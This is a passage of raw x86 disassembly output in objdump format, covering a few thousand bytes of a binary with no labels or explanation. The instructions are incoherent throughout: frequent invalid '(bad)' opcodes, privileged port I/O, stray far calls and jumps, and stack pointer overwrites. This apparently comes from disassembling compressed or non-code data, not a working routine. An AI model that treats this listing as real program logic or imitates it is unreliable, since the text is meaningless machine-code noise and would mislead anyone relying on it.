  422c9d:	e5 33                	in     $0x33,%eax
  422c9f:	02 bc d0 5b b2 71 08 	add    0x871b25b(%eax,%edx,8),%bh
  422ca6:	1d 38 f3 e8 3e       	sbb    $0x3ee8f338,%eax
  422cab:	27                   	daa
  422cac:	b6 07                	mov    $0x7,%dh
  422cae:	1e                   	push   %ds
  422caf:	94                   	xchg   %eax,%esp
  422cb0:	8f                   	(bad)
  422cb1:	b7 74                	mov    $0x74,%bh
  422cb3:	da 5a 8b             	ficompl -0x75(%edx)
  422cb6:	67 2a 5e 3d          	sub    0x3d(%bp),%bl
  422cba:	d4 70                	aam    $0x70
  422cbc:	2e ac                	lods   %cs:(%esi),%al
  422cbe:	14 2e                	adc    $0x2e,%al
  422cc0:	2b 6e 8b             	sub    -0x75(%esi),%ebp
  422cc3:	59                   	pop    %ecx
  422cc4:	17                   	pop    %ss
  422cc5:	48                   	dec    %eax
  422cc6:	f8                   	clc
  422cc7:	0f 76 f3             	pcmpeqd %mm3,%mm6
  422cca:	d9 a5 5a b6 af 0e    	fldenv 0xeafb65a(%ebp)
  422cd0:	c7                   	(bad)
  422cd1:	8d                   	lea    (bad),%edx
  422cd2:	d6                   	salc
  422cd3:	08 6a 57             	or     %ch,0x57(%edx)
  422cd6:	83 20 6a             	andl   $0x6a,(%eax)
  422cd9:	00 72 2d             	add    %dh,0x2d(%edx)
  422cdc:	df 19                	fistps (%ecx)
  422cde:	5e                   	pop    %esi
  422cdf:	37                   	aaa
  422ce0:	bc 9d 1e ba 97       	mov    $0x97ba1e9d,%esp
  422ce5:	b9 7e a8 fb dd       	mov    $0xddfba87e,%ecx
  422cea:	0f c4 b6 0d be 28 07 	pinsrw $0x43,0x728be0d(%esi),%mm6
  422cf1:	43 
  422cf2:	31 00                	xor    %eax,(%eax)
  422cf4:	cb                   	lret
  422cf5:	43                   	inc    %ebx
  422cf6:	4f                   	dec    %edi
  422cf7:	44                   	inc    %esp
  422cf8:	ad                   	lods   %ds:(%esi),%eax
  422cf9:	40                   	inc    %eax
  422cfa:	3a 9a e1 8a 42 1b    	cmp    0x1b428ae1(%edx),%bl
  422d00:	b0 e8                	mov    $0xe8,%al
  422d02:	60                   	pusha
  422d03:	87 26                	xchg   %esp,(%esi)
  422d05:	b2 01                	mov    $0x1,%dl
  422d07:	38 44 0e 44          	cmp    %al,0x44(%esi,%ecx,1)
  422d0b:	79 01                	jns    0x422d0e
  422d0d:	74 ff                	je     0x422d0e
  422d0f:	5e                   	pop    %esi
  422d10:	3f                   	aas
  422d11:	6d                   	insl   (%dx),%es:(%edi)
  422d12:	3f                   	aas
  422d13:	94                   	xchg   %eax,%esp
  422d14:	79 b6                	jns    0x422ccc
  422d16:	b3 76                	mov    $0x76,%bl
  422d18:	2d 9b cc d0 30       	sub    $0x30d0cc9b,%eax
  422d1d:	fa                   	cli
  422d1e:	b5 e7                	mov    $0xe7,%ch
  422d20:	10 04 fe             	adc    %al,(%esi,%edi,8)
  422d23:	4e                   	dec    %esi
  422d24:	6a c4                	push   $0xffffffc4
  422d26:	3b f0                	cmp    %eax,%esi
  422d28:	be 6c 6d 75 b5       	mov    $0xb5756d6c,%esi
  422d2d:	49                   	dec    %ecx
  422d2e:	0d 9d 9d 32 f6       	or     $0xf6329d9d,%eax
  422d33:	e3 31                	jecxz  0x422d66
  422d35:	eb 30                	jmp    0x422d67
  422d37:	1a 8a cc 34 d6 cb    	sbb    -0x3429cb34(%edx),%cl
  422d3d:	17                   	pop    %ss
  422d3e:	99                   	cltd
  422d3f:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  422d40:	b2 02                	mov    $0x2,%dl
  422d42:	7c 4f                	jl     0x422d93
  422d44:	92                   	xchg   %eax,%edx
  422d45:	48                   	dec    %eax
  422d46:	0e                   	push   %cs
  422d47:	5e                   	pop    %esi
  422d48:	c1 84 93 92 1b 82 8e 	roll   $0xac,-0x717de46e(%ebx,%edx,4)
  422d4f:	ac 
  422d50:	1d 1a f1 78 28       	sbb    $0x2878f11a,%eax
  422d55:	83 82 4e 0d 51 95 89 	addl   $0xffffff89,-0x6aaef2b2(%edx)
  422d5c:	7f 79                	jg     0x422dd7
  422d5e:	f3 72 c7             	repz jb 0x422d28
  422d61:	50                   	push   %eax
  422d62:	f9                   	stc
  422d63:	b4 46                	mov    $0x46,%ah
  422d65:	af                   	scas   %es:(%edi),%eax
  422d66:	cc                   	int3
  422d67:	85 26                	test   %esp,(%esi)
  422d69:	9c                   	pushf
  422d6a:	73 cb                	jae    0x422d37
  422d6c:	43                   	inc    %ebx
  422d6d:	b3 7d                	mov    $0x7d,%bl
  422d6f:	da 8c 18 24 0f 93 3a 	fimull 0x3a930f24(%eax,%ebx,1)
  422d76:	52                   	push   %edx
  422d77:	0a 24 dc             	or     (%esp,%ebx,8),%ah
  422d7a:	0f fe 27             	paddd  (%edi),%mm4
  422d7d:	bc 3e bd 91 7a       	mov    $0x7a91bd3e,%esp
  422d82:	30 c5                	xor    %al,%ch
  422d84:	a2 30 5b cb 3c       	mov    %al,0x3ccb5b30
  422d89:	83 1d eb 9f 63 72 f0 	sbbl   $0xfffffff0,0x72639feb
  422d90:	81 3c b1 32 7a 15 5e 	cmpl   $0x5e157a32,(%ecx,%esi,4)
  422d97:	14 6e                	adc    $0x6e,%al
  422d99:	89 96 a3 2d a0 97    	mov    %edx,-0x685fd25d(%esi)
  422d9f:	d5 12                	aad    $0x12
  422da1:	eb bc                	jmp    0x422d5f
  422da3:	74 bf                	je     0x422d64
  422da5:	89 15 38 8a 0f 63    	mov    %edx,0x630f8a38
  422dab:	63 f8                	arpl   %edi,%eax
  422dad:	76 9f                	jbe    0x422d4e
  422daf:	93                   	xchg   %eax,%ebx
  422db0:	7f 04                	jg     0x422db6
  422db2:	3a e0                	cmp    %al,%ah
  422db4:	76 2c                	jbe    0x422de2
  422db6:	d3 a5 0d e5 15 53    	shll   %cl,0x5315e50d(%ebp)
  422dbc:	be da 4d 8a b0       	mov    $0xb08a4dda,%esi
  422dc1:	2b a8 04 92 b1 1b    	sub    0x1bb19204(%eax),%ebp
  422dc7:	1d 3d 48 1f 86       	sbb    $0x861f483d,%eax
  422dcc:	ca e2 42             	lret   $0x42e2
  422dcf:	c7                   	(bad)
  422dd0:	c9                   	leave
  422dd1:	2f                   	das
  422dd2:	47                   	inc    %edi
  422dd3:	b8 8a 74 3a f1       	mov    $0xf13a748a,%eax
  422dd8:	9d                   	popf
  422dd9:	39 2c 0a             	cmp    %ebp,(%edx,%ecx,1)
  422ddc:	66 3b d3             	cmp    %bx,%dx
  422ddf:	23 68 1e             	and    0x1e(%eax),%ebp
  422de2:	84 4e 0f             	test   %cl,0xf(%esi)
  422de5:	6d                   	insl   (%dx),%es:(%edi)
  422de6:	b6 f2                	mov    $0xf2,%dh
  422de8:	25 89 31 a8 34       	and    $0x34a83189,%eax
  422ded:	d7                   	xlat   %ds:(%ebx)
  422dee:	2d cb b2 03 34       	sub    $0x3403b2cb,%eax
  422df3:	12 9f 01 33 9d 71    	adc    0x719d3301(%edi),%bl
  422df9:	90                   	nop
  422dfa:	f8                   	clc
  422dfb:	d4 63                	aam    $0x63
  422dfd:	3c 07                	cmp    $0x7,%al
  422dff:	e2 a9                	loop   0x422daa
  422e01:	9a 70 9f 12 65 96 dc 	lcall  $0xdc96,$0x65129f70
  422e08:	3c 55                	cmp    $0x55,%al
  422e0a:	3d 45 2b e1 87       	cmp    $0x87e12b45,%eax
  422e0f:	93                   	xchg   %eax,%ebx
  422e10:	a8 9a                	test   $0x9a,%al
  422e12:	eb ba                	jmp    0x422dce
  422e14:	da 8b ce 40 1c f1    	fimull -0xee3bf32(%ebx)
  422e1a:	45                   	inc    %ebp
  422e1b:	51                   	push   %ecx
  422e1c:	63 85 b7 78 6d de    	arpl   %eax,-0x21928749(%ebp)
  422e22:	91                   	xchg   %eax,%ecx
  422e23:	56                   	push   %esi
  422e24:	ea 13 06 eb 0c 8d 81 	ljmp   $0x818d,$0xceb0613
  422e2b:	2c 34                	sub    $0x34,%al
  422e2d:	b4 bf                	mov    $0xbf,%ah
  422e2f:	5d                   	pop    %ebp
  422e30:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  422e31:	43                   	inc    %ebx
  422e32:	2c 6e                	sub    $0x6e,%al
  422e34:	06                   	push   %es
  422e35:	06                   	push   %es
  422e36:	a3 df c1 b4 e0       	mov    %eax,0xe0b4c1df
  422e3b:	f0 d3 c9             	lock ror %cl,%ecx
  422e3e:	b7 64                	mov    $0x64,%bh
  422e40:	40                   	inc    %eax
  422e41:	8e 64 12 12          	mov    0x12(%edx,%edx,1),%fs
  422e45:	a2 eb 18 fc 5c       	mov    %al,0x5cfc18eb
  422e4a:	f7 b4 67 60 bf 6c 98 	divl   -0x679340a0(%edi,%eiz,2)
  422e51:	21 f0                	and    %esi,%eax
  422e53:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  422e54:	8f 02                	pop    (%edx)
  422e56:	c2 df 74             	ret    $0x74df
  422e59:	0a 35 38 2f 04 9f    	or     0x9f042f38,%dh
  422e5f:	f0 c0 18 89          	lock rcrb $0x89,(%eax)
  422e63:	ab                   	stos   %eax,%es:(%edi)
  422e64:	d2 be 8a 63 04 6e    	sarb   %cl,0x6e04638a(%esi)
  422e6a:	7d 64                	jge    0x422ed0
  422e6c:	17                   	pop    %ss
  422e6d:	a8 aa                	test   $0xaa,%al
  422e6f:	44                   	inc    %esp
  422e70:	e9 c1 89 0c 1a       	jmp    0x1a4eb836
  422e75:	fa                   	cli
  422e76:	72 06                	jb     0x422e7e
  422e78:	34 f2                	xor    $0xf2,%al
  422e7a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  422e7b:	1a 2e                	sbb    (%esi),%ch
  422e7d:	ad                   	lods   %ds:(%esi),%eax
  422e7e:	b7 64                	mov    $0x64,%bh
  422e80:	d1 65 85             	shll   $1,-0x7b(%ebp)
  422e83:	90                   	nop
  422e84:	42                   	inc    %edx
  422e85:	c2 3a aa             	ret    $0xaa3a
  422e88:	81 df 0c c3 1e 6d    	sbb    $0x6d1ec30c,%edi
  422e8e:	fe                   	(bad)
  422e8f:	ae                   	scas   %es:(%edi),%al
  422e90:	88 79 10             	mov    %bh,0x10(%ecx)
  422e93:	15 b2 00 10 34       	adc    $0x341000b2,%eax
  422e98:	91                   	xchg   %eax,%ecx
  422e99:	2c 05                	sub    $0x5,%al
  422e9b:	e6 a2                	out    %al,$0xa2
  422e9d:	3b a6 80 e0 2d 3d    	cmp    0x3d2de080(%esi),%esp
  422ea3:	1c ea                	sbb    $0xea,%al
  422ea5:	44                   	inc    %esp
  422ea6:	4b                   	dec    %ebx
  422ea7:	be 45 fe 2d 8a       	mov    $0x8a2dfe45,%esi
  422eac:	d6                   	salc
  422ead:	8f                   	(bad)
  422eae:	7d 00                	jge    0x422eb0
  422eb0:	b2 20                	mov    $0x20,%dl
  422eb2:	3c ad                	cmp    $0xad,%al
  422eb4:	36 34 83             	ss xor $0x83,%al
  422eb7:	b6 51                	mov    $0x51,%dh
  422eb9:	72 55                	jb     0x422f10
  422ebb:	f3 ee                	repz out %al,(%dx)
  422ebd:	5e                   	pop    %esi
  422ebe:	6b 9a e0 dc f4 10 32 	imul   $0x32,0x10f4dce0(%edx),%ebx
  422ec5:	50                   	push   %eax
  422ec6:	4b                   	dec    %ebx
  422ec7:	01 15 79 42 4a 24    	add    %edx,0x244a4279
  422ecd:	2c bb                	sub    $0xbb,%al
  422ecf:	13 2b                	adc    (%ebx),%ebp
  422ed1:	1a 84 0b 10 e8 86 ce 	sbb    -0x317917f0(%ebx,%ecx,1),%al
  422ed8:	22 bd 8d a4 07 98    	and    -0x67f85b73(%ebp),%bh
  422ede:	98                   	cwtl
  422edf:	de be ec 40 4e e1    	fidivrs -0x1eb1bf14(%esi)
  422ee5:	4c                   	dec    %esp
  422ee6:	68 c6 c0 17 6a       	push   $0x6a17c0c6
  422eeb:	46                   	inc    %esi
  422eec:	4f                   	dec    %edi
  422eed:	c2 3c e4             	ret    $0xe43c
  422ef0:	ba 2c 11 b3 cb       	mov    $0xcbb3112c,%edx
  422ef5:	2b 4b 1c             	sub    0x1c(%ebx),%ecx
  422ef8:	eb 00                	jmp    0x422efa
  422efa:	24 41                	and    $0x41,%al
  422efc:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  422efd:	b5 28                	mov    $0x28,%ch
  422eff:	6f                   	outsl  %ds:(%esi),(%dx)
  422f00:	a3 01 19 4d 52       	mov    %eax,0x524d1901
  422f05:	03 e3                	add    %ebx,%esp
  422f07:	81 66 bd 5f a5 d6 9b 	andl   $0x9bd6a55f,-0x43(%esi)
  422f0e:	c8 af 46 78          	enter  $0x46af,$0x78
  422f12:	60                   	pusha
  422f13:	5c                   	pop    %esp
  422f14:	18 73 b9             	sbb    %dh,-0x47(%ebx)
  422f17:	5f                   	pop    %edi
  422f18:	3e fd                	ds std
  422f1a:	23 16                	and    (%esi),%edx
  422f1c:	16                   	push   %ss
  422f1d:	d5 85                	aad    $0x85
  422f1f:	1a 0f                	sbb    (%edi),%cl
  422f21:	5c                   	pop    %esp
  422f22:	0f cf                	bswap  %edi
  422f24:	01 ca                	add    %ecx,%edx
  422f26:	69 b8 32 26 1a 19 4a 	imul   $0x7d7f044a,0x191a2632(%eax),%edi
  422f2d:	04 7f 7d 
  422f30:	cc                   	int3
  422f31:	4b                   	dec    %ebx
  422f32:	8e c6                	mov    %esi,%es
  422f34:	34 5f                	xor    $0x5f,%al
  422f36:	12 35 b3 18 76 e8    	adc    0xe87618b3,%dh
  422f3c:	e6 ea                	out    %al,$0xea
  422f3e:	5a                   	pop    %edx
  422f3f:	c8 4f 63 45          	enter  $0x634f,$0x45
  422f43:	82 a1 b6 38 e0 d4 83 	andb   $0x83,-0x2b1fc74a(%ecx)
  422f4a:	c4 62 62             	les    0x62(%edx),%esp
  422f4d:	ad                   	lods   %ds:(%esi),%eax
  422f4e:	bd 11 41 14 ce       	mov    $0xce144111,%ebp
  422f53:	f9                   	stc
  422f54:	7f dc                	jg     0x422f32
  422f56:	cd 7b                	int    $0x7b
  422f58:	42                   	inc    %edx
  422f59:	fa                   	cli
  422f5a:	56                   	push   %esi
  422f5b:	2f                   	das
  422f5c:	bb f7 48 1c a7       	mov    $0xa71c48f7,%ebx
  422f61:	cc                   	int3
  422f62:	bf b0 e3 ab 5c       	mov    $0x5cabe3b0,%edi
  422f67:	b0 d2                	mov    $0xd2,%al
  422f69:	f1                   	int1
  422f6a:	cb                   	lret
  422f6b:	e2 ce                	loop   0x422f3b
  422f6d:	da 39                	fidivrl (%ecx)
  422f6f:	c5 07                	lds    (%edi),%eax
  422f71:	23 67 50             	and    0x50(%edi),%esp
  422f74:	b3 9a                	mov    $0x9a,%bl
  422f76:	28 fc                	sub    %bh,%ah
  422f78:	9a 60 b7 4a 05 b6 8a 	lcall  $0x8ab6,$0x54ab760
  422f7f:	ad                   	lods   %ds:(%esi),%eax
  422f80:	04 17                	add    $0x17,%al
  422f82:	c6                   	(bad)
  422f83:	ba 3f 6c ac df       	mov    $0xdfac6c3f,%edx
  422f88:	23 94 93 0f 1c 9a 88 	and    -0x7765e3f1(%ebx,%edx,4),%edx
  422f8f:	8f 44 42 e8          	pop    -0x18(%edx,%eax,2)
  422f93:	41                   	inc    %ecx
  422f94:	85 78 19             	test   %edi,0x19(%eax)
  422f97:	8d 80 89 0f 15 95    	lea    -0x6aeaf077(%eax),%eax
  422f9d:	bf 11 6a 99 df       	mov    $0xdf996a11,%edi
  422fa2:	4f                   	dec    %edi
  422fa3:	80 05 b4 44 3a f2 45 	addb   $0x45,0xf23a44b4
  422faa:	63 f1                	arpl   %esi,%ecx
  422fac:	e0 6f                	loopne 0x42301d
  422fae:	1b 6f d6             	sbb    -0x2a(%edi),%ebp
  422fb1:	b9 5f ef 8f d1       	mov    $0xd18fef5f,%ecx
  422fb6:	0e                   	push   %cs
  422fb7:	04 03                	add    $0x3,%al
  422fb9:	cb                   	lret
  422fba:	9d                   	popf
  422fbb:	ff 05 ef 2d b2 65    	incl   0x65b22def
  422fc1:	1f                   	pop    %ds
  422fc2:	9e                   	sahf
  422fc3:	0e                   	push   %cs
  422fc4:	10 77 86             	adc    %dh,-0x7a(%edi)
  422fc7:	21 4d d4             	and    %ecx,-0x2c(%ebp)
  422fca:	52                   	push   %edx
  422fcb:	f8                   	clc
  422fcc:	70 a1                	jo     0x422f6f
  422fce:	68 3e 3c a2 6b       	push   $0x6ba23c3e
  422fd3:	74 0a                	je     0x422fdf
  422fd5:	e2 9a                	loop   0x422f71
  422fd7:	4c                   	dec    %esp
  422fd8:	45                   	inc    %ebp
  422fd9:	70 cd                	jo     0x422fa8
  422fdb:	26 f8                	es clc
  422fdd:	09 00                	or     %eax,(%eax)
  422fdf:	71 ba                	jno    0x422f9b
  422fe1:	6e                   	outsb  %ds:(%esi),(%dx)
  422fe2:	98                   	cwtl
  422fe3:	04 a3                	add    $0xa3,%al
  422fe5:	0c 1f                	or     $0x1f,%al
  422fe7:	ab                   	stos   %eax,%es:(%edi)
  422fe8:	af                   	scas   %es:(%edi),%eax
  422fe9:	99                   	cltd
  422fea:	49                   	dec    %ecx
  422feb:	de d6                	(bad)
  422fed:	df 3a                	fistpll (%edx)
  422fef:	d3 bd 46 4c be 9f    	sarl   %cl,-0x6041b3ba(%ebp)
  422ff5:	75 60                	jne    0x423057
  422ff7:	97                   	xchg   %eax,%edi
  422ff8:	29 b9 9f a5 f1 85    	sub    %edi,-0x7a0e5a61(%ecx)
  422ffe:	98                   	cwtl
  422fff:	c9                   	leave
  423000:	46                   	inc    %esi
  423001:	b2 b1                	mov    $0xb1,%dl
  423003:	91                   	xchg   %eax,%ecx
  423004:	35 b7 a3 a2 23       	xor    $0x23a2a3b7,%eax
  423009:	67 9a cd 51 33 b0 2f 	addr16 lcall $0x32f,$0xb03351cd
  423010:	03 
  423011:	57                   	push   %edi
  423012:	89 04 37             	mov    %eax,(%edi,%esi,1)
  423015:	63 74 62 eb          	arpl   %esi,-0x15(%edx,%eiz,2)
  423019:	c2 c5 20             	ret    $0x20c5
  42301c:	bc 79 25 6c fb       	mov    $0xfb6c2579,%esp
  423021:	c9                   	leave
  423022:	60                   	pusha
  423023:	64 b6 02             	fs mov $0x2,%dh
  423026:	f1                   	int1
  423027:	d7                   	xlat   %ds:(%ebx)
  423028:	7d f9                	jge    0x423023
  42302a:	ee                   	out    %al,(%dx)
  42302b:	3a 4d c1             	cmp    -0x3f(%ebp),%cl
  42302e:	d4 a7                	aam    $0xa7
  423030:	89 19                	mov    %ebx,(%ecx)
  423032:	e4 84                	in     $0x84,%al
  423034:	42                   	inc    %edx
  423035:	83 d1 26             	adc    $0x26,%ecx
  423038:	5a                   	pop    %edx
  423039:	c4 35 2c 72 4d cb    	les    0xcb4d722c,%esi
  42303f:	e6 d4                	out    %al,$0xd4
  423041:	6e                   	outsb  %ds:(%esi),(%dx)
  423042:	04 6a                	add    $0x6a,%al
  423044:	3a 8e 0f e7 0c a2    	cmp    -0x5df318f1(%esi),%cl
  42304a:	76 5d                	jbe    0x4230a9
  42304c:	ef                   	out    %eax,(%dx)
  42304d:	2d 1f f7 cd c3       	sub    $0xc3cdf71f,%eax
  423052:	fd                   	std
  423053:	cd c7                	int    $0xc7
  423055:	9b                   	fwait
  423056:	76 89                	jbe    0x422fe1
  423058:	f8                   	clc
  423059:	17                   	pop    %ss
  42305a:	fa                   	cli
  42305b:	14 b7                	adc    $0xb7,%al
  42305d:	fe                   	(bad)
  42305e:	23 df                	and    %edi,%ebx
  423060:	b3 b1                	mov    $0xb1,%bl
  423062:	a8 81                	test   $0x81,%al
  423064:	4d                   	dec    %ebp
  423065:	b6 29                	mov    $0x29,%dh
  423067:	ab                   	stos   %eax,%es:(%edi)
  423068:	be 10 5d 42 b6       	mov    $0xb6425d10,%esi
  42306d:	67 11 dd             	addr16 adc %ebx,%ebp
  423070:	2a 0b                	sub    (%ebx),%cl
  423072:	c2 31 96             	ret    $0x9631
  423075:	e3 e3                	jecxz  0x42305a
  423077:	ef                   	out    %eax,(%dx)
  423078:	75 27                	jne    0x4230a1
  42307a:	e6 fa                	out    %al,$0xfa
  42307c:	14 17                	adc    $0x17,%al
  42307e:	e2 8b                	loop   0x42300b
  423080:	63 a9 91 0c 67 c6    	arpl   %ebp,-0x3998f36f(%ecx)
  423086:	81 70 47 e2 af 18 35 	xorl   $0x3518afe2,0x47(%eax)
  42308d:	6d                   	insl   (%dx),%es:(%edi)
  42308e:	2e 73 77             	jae,pn 0x423108
  423091:	52                   	push   %edx
  423092:	a8 f2                	test   $0xf2,%al
  423094:	92                   	xchg   %eax,%edx
  423095:	9b                   	fwait
  423096:	54                   	push   %esp
  423097:	9f                   	lahf
  423098:	ce                   	into
  423099:	d4 e7                	aam    $0xe7
  42309b:	b7 e2                	mov    $0xe2,%bh
  42309d:	55                   	push   %ebp
  42309e:	7f 44                	jg     0x4230e4
  4230a0:	40                   	inc    %eax
  4230a1:	93                   	xchg   %eax,%ebx
  4230a2:	69 67 b1 8c b4 bb 5f 	imul   $0x5fbbb48c,-0x4f(%edi),%esp
  4230a9:	35 02 d0 35 c2       	xor    $0xc235d002,%eax
  4230ae:	ff 9f b5 9e 21 58    	lcall  *0x58219eb5(%edi)
  4230b4:	6a c0                	push   $0xffffffc0
  4230b6:	0d 6d 6e 7d a9       	or     $0xa97d6e6d,%eax
  4230bb:	1e                   	push   %ds
  4230bc:	27                   	daa
  4230bd:	bb f6 21 71 55       	mov    $0x557121f6,%ebx
  4230c2:	cd 1a                	int    $0x1a
  4230c4:	47                   	inc    %edi
  4230c5:	a0 34 b7 1b 9f       	mov    0x9f1bb734,%al
  4230ca:	b0 a8                	mov    $0xa8,%al
  4230cc:	3b bb e7 7b 2d 88    	cmp    -0x77d28419(%ebx),%edi
  4230d2:	aa                   	stos   %al,%es:(%edi)
  4230d3:	24 fa                	and    $0xfa,%al
  4230d5:	08 db                	or     %bl,%bl
  4230d7:	54                   	push   %esp
  4230d8:	00 5e 80             	add    %bl,-0x80(%esi)
  4230db:	c3                   	ret
  4230dc:	5c                   	pop    %esp
  4230dd:	0c 67                	or     $0x67,%al
  4230df:	1b 53 e9             	sbb    -0x17(%ebx),%edx
  4230e2:	6a 03                	push   $0x3
  4230e4:	60                   	pusha
  4230e5:	32 13                	xor    (%ebx),%dl
  4230e7:	ba d6 92 f1 2f       	mov    $0x2ff192d6,%edx
  4230ec:	14 ce                	adc    $0xce,%al
  4230ee:	6a dc                	push   $0xffffffdc
  4230f0:	ef                   	out    %eax,(%dx)
  4230f1:	97                   	xchg   %eax,%edi
  4230f2:	66 66 f4             	data16 data16 hlt
  4230f5:	76 34                	jbe    0x42312b
  4230f7:	d8 39                	fdivrs (%ecx)
  4230f9:	ef                   	out    %eax,(%dx)
  4230fa:	73 99                	jae    0x423095
  4230fc:	6d                   	insl   (%dx),%es:(%edi)
  4230fd:	71 07                	jno    0x423106
  4230ff:	f5                   	cmc
  423100:	e6 a9                	out    %al,$0xa9
  423102:	d6                   	salc
  423103:	8d                   	lea    (bad),%edi
  423104:	fa                   	cli
  423105:	04 14                	add    $0x14,%al
  423107:	47                   	inc    %edi
  423108:	70 57                	jo     0x423161
  42310a:	cf                   	iret
  42310b:	49                   	dec    %ecx
  42310c:	53                   	push   %ebx
  42310d:	25 cc da 4a 0e       	and    $0xe4adacc,%eax
  423112:	51                   	push   %ecx
  423113:	03 aa d0 81 d6 27    	add    0x27d681d0(%edx),%ebp
  423119:	d4 1a                	aam    $0x1a
  42311b:	97                   	xchg   %eax,%edi
  42311c:	58                   	pop    %eax
  42311d:	8b c2                	mov    %edx,%eax
  42311f:	cf                   	iret
  423120:	46                   	inc    %esi
  423121:	d1 7b 28             	sarl   $1,0x28(%ebx)
  423124:	b9 78 5e 5a 56       	mov    $0x565a5e78,%ecx
  423129:	6d                   	insl   (%dx),%es:(%edi)
  42312a:	4e                   	dec    %esi
  42312b:	2c 7d                	sub    $0x7d,%al
  42312d:	5c                   	pop    %esp
  42312e:	4c                   	dec    %esp
  42312f:	1c cc                	sbb    $0xcc,%al
  423131:	dd 12                	fstl   (%edx)
  423133:	fd                   	std
  423134:	7a b0                	jp     0x4230e6
  423136:	76 a2                	jbe    0x4230da
  423138:	89 06                	mov    %eax,(%esi)
  42313a:	07                   	pop    %es
  42313b:	55                   	push   %ebp
  42313c:	85 2a                	test   %ebp,(%edx)
  42313e:	86 cf                	xchg   %cl,%bh
  423140:	aa                   	stos   %al,%es:(%edi)
  423141:	ab                   	stos   %eax,%es:(%edi)
  423142:	d1 88 99 eb 04 04    	rorl   $1,0x404eb99(%eax)
  423148:	90                   	nop
  423149:	e4 e8                	in     $0xe8,%al
  42314b:	d0 10                	rclb   $1,(%eax)
  42314d:	d4 33                	aam    $0x33
  42314f:	64 c9                	fs leave
  423151:	c2 52 80             	ret    $0x8052
  423154:	53                   	push   %ebx
  423155:	70 8b                	jo     0x4230e2
  423157:	44                   	inc    %esp
  423158:	78 42                	js     0x42319c
  42315a:	29 b0 8e a8 b7 31    	sub    %esi,0x31b7a88e(%eax)
  423160:	1b 98 0b cd 0b f7    	sbb    -0x8f432f5(%eax),%ebx
  423166:	20 ef                	and    %ch,%bh
  423168:	3b c1                	cmp    %ecx,%eax
  42316a:	2d 83 25 be 54       	sub    $0x54be2583,%eax
  42316f:	e8 ce bb 5f ca       	call   0xcaa1ed42
  423174:	49                   	dec    %ecx
  423175:	1a 4a 0e             	sbb    0xe(%edx),%cl
  423178:	47                   	inc    %edi
  423179:	ba 66 33 13 cf       	mov    $0xcf133366,%edx
  42317e:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  42317f:	8c f2                	mov    %?,%edx
  423181:	e9 07 11 30 8c       	jmp    0x8c72428d
  423186:	0e                   	push   %cs
  423187:	69 93 5f ae 00 24 55 	imul   $0x87720f55,0x2400ae5f(%ebx),%edx
  42318e:	0f 72 87 
  423191:	2c 8e                	sub    $0x8e,%al
  423193:	18 73 37             	sbb    %dh,0x37(%ebx)
  423196:	f0 d1 fe             	lock sar $1,%esi
  423199:	dc 40 74             	faddl  0x74(%eax)
  42319c:	dc bb 28 93 57 87    	fdivrl -0x78a86cd8(%ebx)
  4231a2:	dc 6f 4b             	fsubrl 0x4b(%edi)
  4231a5:	7f b9                	jg     0x423160
  4231a7:	ae                   	scas   %es:(%edi),%al
  4231a8:	21 67 1e             	and    %esp,0x1e(%edi)
  4231ab:	4e                   	dec    %esi
  4231ac:	96                   	xchg   %eax,%esi
  4231ad:	0c 98                	or     $0x98,%al
  4231af:	1d 1b cc 7c c9       	sbb    $0xc97ccc1b,%eax
  4231b4:	73 7a                	jae    0x423230
  4231b6:	b9 8a 51 27 7c       	mov    $0x7c27518a,%ecx
  4231bb:	85 fb                	test   %edi,%ebx
  4231bd:	1f                   	pop    %ds
  4231be:	5d                   	pop    %ebp
  4231bf:	48                   	dec    %eax
  4231c0:	f3 4d                	repz dec %ebp
  4231c2:	4d                   	dec    %ebp
  4231c3:	4f                   	dec    %edi
  4231c4:	72 d7                	jb     0x42319d
  4231c6:	fb                   	sti
  4231c7:	0a 19                	or     (%ecx),%bl
  4231c9:	04 b1                	add    $0xb1,%al
  4231cb:	49                   	dec    %ecx
  4231cc:	b6 c1                	mov    $0xc1,%dh
  4231ce:	26 80 28 b5          	subb   $0xb5,%es:(%eax)
  4231d2:	33 55 d1             	xor    -0x2f(%ebp),%edx
  4231d5:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4231d6:	0c 95                	or     $0x95,%al
  4231d8:	8f                   	(bad)
  4231d9:	33 43 5b             	xor    0x5b(%ebx),%eax
  4231dc:	01 5e e1             	add    %ebx,-0x1f(%esi)
  4231df:	3e 7f 24             	jg,pt  0x423206
  4231e2:	ee                   	out    %al,(%dx)
  4231e3:	1f                   	pop    %ds
  4231e4:	4c                   	dec    %esp
  4231e5:	3a 04 af             	cmp    (%edi,%ebp,4),%al
  4231e8:	4a                   	dec    %edx
  4231e9:	98                   	cwtl
  4231ea:	c6                   	(bad)
  4231eb:	aa                   	stos   %al,%es:(%edi)
  4231ec:	58                   	pop    %eax
  4231ed:	6c                   	insb   (%dx),%es:(%edi)
  4231ee:	b7 92                	mov    $0x92,%bh
  4231f0:	c7                   	(bad)
  4231f1:	8c b6 73 77 18 ab    	mov    %?,-0x54e7888d(%esi)
  4231f7:	4d                   	dec    %ebp
  4231f8:	17                   	pop    %ss
  4231f9:	c8 96 78 4a          	enter  $0x7896,$0x4a
  4231fd:	53                   	push   %ebx
  4231fe:	92                   	xchg   %eax,%edx
  4231ff:	b8 6b 85 87 e1       	mov    $0xe187856b,%eax
  423204:	34 d5                	xor    $0xd5,%al
  423206:	6c                   	insb   (%dx),%es:(%edi)
  423207:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  423208:	f1                   	int1
  423209:	fc                   	cld
  42320a:	5e                   	pop    %esi
  42320b:	93                   	xchg   %eax,%ebx
  42320c:	29 38                	sub    %edi,(%eax)
  42320e:	6c                   	insb   (%dx),%es:(%edi)
  42320f:	68 cd 45 43 36       	push   $0x364345cd
  423214:	b2 da                	mov    $0xda,%dl
  423216:	32 4e ea             	xor    -0x16(%esi),%cl
  423219:	fa                   	cli
  42321a:	22 fe                	and    %dh,%bh
  42321c:	9d                   	popf
  42321d:	87 ea                	xchg   %ebp,%edx
  42321f:	96                   	xchg   %eax,%esi
  423220:	f5                   	cmc
  423221:	77 2b                	ja     0x42324e
  423223:	92                   	xchg   %eax,%edx
  423224:	97                   	xchg   %eax,%edi
  423225:	9f                   	lahf
  423226:	f2 60                	repnz pusha
